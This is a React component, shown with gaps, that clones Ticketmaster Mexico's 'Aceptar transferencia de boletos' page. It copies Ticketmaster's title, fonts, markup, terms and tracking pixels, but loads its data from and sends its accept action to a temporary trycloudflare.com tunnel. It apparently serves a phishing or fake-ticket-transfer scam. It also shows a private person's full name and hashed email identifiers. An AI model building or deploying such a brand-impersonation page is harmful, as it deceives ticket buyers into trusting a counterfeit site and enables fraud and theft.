...
export default function TransferDetalle() {
...
useEffect(() => {
  const obtener = async () => {
    try {
      const res = await fetch("https://falling-perfectly-louise-equity.trycloudflare.com/api/mis-transferencias", {
        headers: {
...
const aceptarBoleto = async () => {
  ...
  try {
    await fetch(`https://falling-perfectly-louise-equity.trycloudflare.com/api/aceptar-boleto/${t.id}`, {
      method: "POST",
      headers: {
        Authorization: `Bearer ${localStorage.getItem("token")}`
      }
...
//Formateo de fecha
const fecha = new Date(t.fecha_evento);
...
const hora = fecha.toLocaleTimeString("es-MX", {
  ...
  return (
    ...
    <title>Ticketmaster - Mi Cuenta | Aceptar Transferencia</title>
    ...
    <style
      dangerouslySetInnerHTML={{
        __html:
          '      @font-face {        font-weight: 900;        font-family: "Averta";        font-style: normal;        src:          url(\/\/uk\.tmconst\.com\/rc-51677358\/fonts\/averta-black\.woff2)            format("woff2"),          url(\/\/uk\.tmconst\.com\/rc-51677358\/fonts\/averta-black\.woff)            format("woff");      }      @font-face {        font-weight: 800;        font-family: "Averta";        font-style: normal;        src:          url(\/\/uk\.tmconst\.com\/rc-51677358\/fonts\/averta-extrabold\.woff2)            format("woff2"),          url(\/\/uk\.tmconst\.com\/rc-51677358\/fonts\/averta-extrabold\.woff)            format("woff");      }      @font-face {        font-weight: 700;        font-family: "Averta";        font-style: normal;        src:          url(\/\/uk\.tmconst\.com\/rc-51677358\/fonts\/averta-bold\.woff2)            format("woff2"),          url(\/\/uk\.tmconst\.com\/rc-51677358\/fonts\/averta-bold\.woff)            format("woff");      }      @font-face {        font-weight: 600;        font-family: "Averta";        font-style: normal;        src:          url(\/\/uk\.tmconst\.com\/rc-51677358\/fonts\/averta-semibold\.woff2)            format("woff2"),          url(\/\/uk\.tmconst\.com\/rc-51677358\/fonts\/averta-semibold\.woff)            format("woff");      }      @font-face {        font-weight: 400;        font-family: "Averta";        font-style: normal;        src:          url(\/\/uk\.tmconst\.com\/rc-51677358\/fonts\/averta-regular\.woff2)            format("woff2"),          url(\/\/uk\.tmconst\.com\/rc-51677358\/fonts\/averta-regular\.woff)            format("woff");      }    ',
      }}
    />
    <img
      height="1px"
    ...
    <img
      height="1px"
      src="https://www.facebook.com/tr/?id=1670559986527881&ev=PageView&ud[em]=43ada92772b6f6f7da943ba97e32f82c37a6f41e6f64a6dc1ddbbe28ba8926a0&noscript=1"
      style={{
        display: "none",
      }}
      width="1px"
    ...
    <img
      height="1px"
      src="https://www.facebook.com/tr/?id=1670559986527881&ev=ViewContent&ud[em]=43ada92772b6f6f7da943ba97e32f82c37a6f41e6f64a6dc1ddbbe28ba8926a0&cd[Domain]=www.ticketmaster.com.mx&cd[PageType]=Global%20Post%20Purchase&cd[MajorCategoryID]=&cd[MajorCategoryName]=&cd[MinorCategoryID]=&cd[MinorCategoryName]=&cd[ArtistID]=&cd[ArtistName]=&cd[EventID]=&cd[EventName]=&cd[VenueID]=&cd[VenueName]=&cd[PromoterID]=&cd[DiscoEventID]=&cd[DiscoAttractionID]=&cd[DiscoVenueID]=&cd[InventoryChannel]=&noscript=1"
      style={{
        display: "none",
      }}
      width="1px"
    ...
    <link
      as="script"
      crossOrigin="anonymous"
      href="//uk.tmconst.com/rc-51677358/_next/static/chunks/pages/user/orders-865e1cc09e6eba3b.js"
      rel="prefetch"
    />
    <link
      as="script"
                    ...
                    <div className="sc-d526de88-2 iDAcma">
                      <div className="sc-d526de88-3 kgJzNW">
                        ...
                        <input
                          ...
                          aria-controls=":R1dnam: :R1dnamH1: :R1dnamH2:"
                          aria-expanded="true"
                          autoCapitalize="none"
                          autoComplete="off"
                          autoCorrect="off"
          ...
          <div className="sc-c5823f72-0 elhkFb">
            <div className="sc-c5823f72-1 fMkLLa">
              <div className="sc-c5823f72-2 jxfplU">
                <div className="sc-7b9bf362-0 kjVWVb sc-5f5e853-0 iYXjxl">
                  <div className="sc-7b9bf362-1 dsmomw"  style={{backgroundImage: `url(${t.imagen})`}}/>
                        ...
                        <div className="sc-46df6f19-1 wqjcW">
                          ...
                          <div className="sc-46df6f19-2 bwvA-Dg">
                            ...
                            <div className="sc-46df6f19-3 lbUdce">
                              ...
                              <span aria-hidden="true">
                                <div className="sc-75dcd6e3-0 hONbtM">
              ...
              <div className="sc-8486e8e9-0 jOAVSY sc-c5823f72-13 hFXSQL">
                <p className="sc-8486e8e9-1 fmiwWm">
                  ...
                  <span className="sc-8486e8e9-3 iTJOrD" data-cs-mask="true">
                    Jimena Esmeralda Mendoza Trejo
                  </span>
                </p>
              </div>
            </div>
            ...
            <div className="sc-c5823f72-10 jUtEHQ">
              <div className="sc-c5823f72-12 euvicg">
                <form
                  className="sc-3bfb48cf-2 sc-12f2e032-0 covozP hnZmOw"
                  noValidate>
                  <div className="sc-3bfb48cf-4 jukxf">
                    <div className="indexstyles__Card-sc-cvxwg8-0 sc-12f2e032-1 cfGQrC bMrmyH">
                      <div className="indexstyles__Body-sc-cvxwg8-2 sc-12f2e032-2 eguRCZ hwzrcZ">
                        <div className="Stack-sc-br1alc-0 bcKaVK">
                          <div className="Stack-sc-br1alc-0 bcKaUz">
                            <h1 className="sc-12f2e032-4 cNKYPu">
                              Aceptar transferencia de boletos
                            </h1>
                            <p>
                             Has recibido un boleto de{" "}
                             <strong>{t.nombre_emisor}</strong>
                            </p>
                            <p>
                              Once you accept the transfer, the ticket(s) will
                              be located in your account.
                            </p>
                          </div>
                          <div className="Stack-sc-br1alc-0 bcKaXb">
                            <ul
                              className="UnstyledList-sc-ix96mm-0 sc-342e3ff1-4 ekOJfs gbUyK"
                              role="list">
                              <li
                                className="sc-342e3ff1-0 iXSCFu"
                                role="listitem">
                                <div className="sc-342e3ff1-1 dRhttv">
                                  <div className="sc-342e3ff1-2 hysvrT">
                                    <svg
                                      aria-hidden="true"
                            ...
                            <div className="sc-1709d72f-2 czTeNd">
                              <svg
                                aria-hidden="true"
                                className="BaseSvg-sc-yh8lnd-0 ChatBubbleFilledIcon___StyledBaseSvg-sc-1a5it3z-0 hNajXU"
                                focusable="false"
                                height="1.5em"
                                viewBox="0 0 24 24"
                                width="1.5em">
                                <path d="M1 3h22v14.4H6.28L1 22zm7.5 5.5h-3v3h3zm2 0v3h3v-3zm8 0h-3v3h3z" />
                              </svg>
                              <div>
                                <h4 className="sc-1709d72f-0 dxDnWD">
                                  Mensaje de {t.nombre_emisor}
                                </h4>
                                <p className="sc-1709d72f-1 fzdEoT">{t.mensaje}</p>
                              </div>
                            </div>
                          </div>
                          <hr className="sc-12f2e032-5 bLiNwl" />
                          <p className="sc-12f2e032-6 heBtaN">
                            La transferencia solo está disponible para boletos,
                            productos, servicios y extras seleccionados (cada
                            uno un "Producto" y colectivamente "Productos").
                            Debes tener una cuenta activa para poder recibir un
                            Producto mediante Transferencia de Producto. Si
                            acepta una Transferencia de Producto o utiliza un
                            Producto comprado por otra persona, acepta estos
                            términos, nuestro
                            <a
                            ...
                            y todas las reglas, políticas, términos y
                            condiciones establecidos por el Organizador del
                            Evento (colectivamente, los “Términos”). Debes
                            conocer y confiar en la persona que le transfiere el
                            Producto antes de aceptarlo. Si el Producto que se
                            le transfirió se obtuvo o se transfirió de manera
                            fraudulenta o en violación de los Términos, podemos
                            cancelar el Producto en cualquier momento sin previo
                            aviso. Solo el comprador original de los Productos
                            transferidos, no el destinatario de una
                            Transferencia de Producto, es elegible para
                            cualquier reembolso, crédito o cambio (cuando esté
                            disponible) si un evento se cancela, reprograma o
                            modifica materialmente. Aceptas que Ticketmaster no
                            será responsable bajo ninguna circunstancia. Si el
                            comprador original desea aprovechar cualquier opción
                            de reembolso y/o crédito disponible, deberá
                            transferir el Producto nuevamente al comprador
                            original. Una vez que el Producto se haya
                            transferido nuevamente al comprador original, el
                            comprador original deberá comunicarse con Fan
                            Support para completar su solicitud. Si recibió una
                            Transferencia de Producto para un Producto del
                            Mercado Secundario que compró fuera de Ticketmaster,
                            deberá comunicarse con el punto de compra del
                            Mercado Secundario para obtener cualquier opción de
                            reembolso y/o crédito, si está disponible.
                          </p>
                          <div className="sc-12f2e032-3 hZixLr">
                            <span
                              className="VisuallyHidden-sc-8buqks-0 lmhoCy"
                              id="noThanksAriaLabel">
                              Declinar la transferencia y llevarme a próximos
                              eventos
                            </span>
                            <button
                              aria-describedby="noThanksAriaLabel"
                              className="indexstyles__StyledButton-sc-83qv1q-0 iTqNMc sc-12f2e032-7 hnBlPa"
                              type="button">
                            ...
                            <span
                              className="VisuallyHidden-sc-8buqks-0 lmhoCy"
                              id="acceptAriaLabel">
                              Aceptar la transferencia de boletos y llevarme a
                              mi orden
                            </span>
                            <button
                              aria-describedby="acceptAriaLabel"
                              className="indexstyles__StyledButton-sc-83qv1q-0 dSTFtM sc-12f2e032-8 kTtvHN"
                              type="button"
                              onClick={aceptarBoleto}>
                              <span className="indexstyles__FlexWrapper-sc-83qv1q-1 hJuAcy">
                                <span>Aceptar la transferencia de boleto</span>
                              </span>
                            </button>
                            {loading && (
                              <div className="tm-overlay">
                                <div className="tm-modal">
                                  ...
                                  <p>Espera, estamos trabajando en tu solicitud.</p>
                                </div>
                              </div>
                            )}
                          </div>
    ...
    <div
      ...
      <img
        ...
        aria-hidden="true"
        height="0"
        src="https://nova.collect.igodigital.com/c2/523000091/track_page_view?payload=%7B%22title%22%3A%22Ticketmaster%20-%20Mi%20Cuenta%20%7C%20Aceptar%20Transferencia%22%2C%22url%22%3A%22https%3A%2F%2Fwww.ticketmaster.com.mx%2Fuser%2Ftransfer%2FKZR-bV_tscMoxAMeMBz9CTo1Z2Q8%3Flanguage%3Des-mx%26sfmc_sub%3D1426530123%26utm_source%3Deml-tm_dev_recipientinitiated_mx_es-mx_v07_prod%26utm_medium%3Demail%26utm_campaign%3D523002129_4068204_3%2F14%2F2026%22%2C%22referrer%22%3A%22%22%2C%22user_info%22%3A%7B%22email%22%3A%228d835309285e5bab2f52caf60e345a4c64cd61384da4fdb8c8f3f6d469b32d76%22%7D%7D"
        style={{
          display: "none",
        }}
        title="blank image"
